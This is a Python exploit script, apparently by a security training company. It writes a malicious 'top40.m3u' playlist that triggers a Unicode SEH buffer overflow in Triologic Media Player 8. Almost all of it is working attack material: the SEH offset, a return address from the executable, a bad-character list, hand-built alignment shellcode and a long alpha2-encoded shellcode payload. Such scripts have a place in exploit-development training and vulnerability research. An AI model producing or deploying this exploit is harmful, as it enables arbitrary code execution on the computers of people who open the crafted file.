# Author: Uday Mittal
# Company: Yaksas CSC
# Contact: csc@yaksas.in | twitter.com/yaksas443

#This code exploits the unicode buffer overflow vulnerability in Triologic Media Player 8.

# SEH Offset: 536
#   0x004100f2 : pop esi # pop ebx # ret 0x04 | startnull,unicode {PAGE_EXECUTE_READWRITE} [triomp8.exe] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v8.0.0.0 (C:\Program Files\Triologic\Triologic Media Player\triomp8.exe)

# Bad characters \x00\x0A\x80\x82

align = (
"\x53"                      #push EBX   
"\x71"                      #Unicode Nop
"\x58"                      #pop EAX
"\x71"                      #Unicode Nop
"\x05\x07\x11"              #add eax,0x11000700  \
"\x71"                      #Unicode Nop         |> +600
"\x2d\x01\x11"              #sub eax,0x11000100  /
"\x71"                      #Unicode Nop
"\x50"                      #push EAX
"\x71"                      #Unicode Nop
"\xC3") #RETN
# Because we are using alpha2 encoder the bad characters we identified didn't matter because everything is uppercase

buf = "PPYAIAIAIAIAQATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLZHSRM0KPM030SYZEP1WP1T4KB0P0DKPRLL4KPRMD4KD2MXLO87OZO6NQKOVLOLQQSLLBNLMP91XOLMKQGWYRL2QBPWDKR2N04KOZOL4KPLLQ2XJCOXKQJ1R14KPYMPM1XSTK0IN89SOJOYDK044KKQXVNQKOVLY1HOLMKQHGNXK0RUJVKSSMJXOKSMMTRUITB8TK0XMTKQ8S36TKLLPKTKPXMLM1XSTKLDTKM1HP3YOTNDO41KQKQQPY0ZPQKOYP1O1OPZDKMBJKTM1MRHP302KPM0RH3G2SOBQO242H0LSGO6M759JHKOXPWHDPM1KPKPNI8DQD0PC8O9U0RKM0KOXURJLJS8GPW82ZB4S8LBM0N11LSYK6B0PPPP0POP0POP201XJJLOYOYPKOYETW2JLPPVPWRHTYG5RT31KOXUSUWPD4LJKOPNLHRUJLK837KPM0M01ZKPBJLDPVPW2HKRXYXHQOKOZ5CSKHKPCNOFTKNVQZOPQXKPN0KPM0QFRJKPRHB8ETPSJEKOJ54SQCQZKPPVPS0WQXKRZ97XQOKOZ5E3ZXKPCMMXQHQXKP10KPKP1ZKPPP38LKNOLOP0KOHU272HRURNPMQQKOXU1NQNKOLLMTLOSU2PKOKOKOYY5KKOKOKOKQWSO97V2UWQ8CWKL07EERPVRJM0PSKOZ5A"

evilString = "A" * 536 + "\x41\x71" + "\xf2\x41" + align + "F" * 57 + "EEEEE" + "D" * 3000
evilString = "A" * 536 + "\x41\x71" + "\xf2\x41" + align + "F" * 57 + buf + "D" * (3000-len(buf))


filename = "top40.m3u"

m3ufile = open(filename,'w')
m3ufile.write(evilString)
m3ufile.close()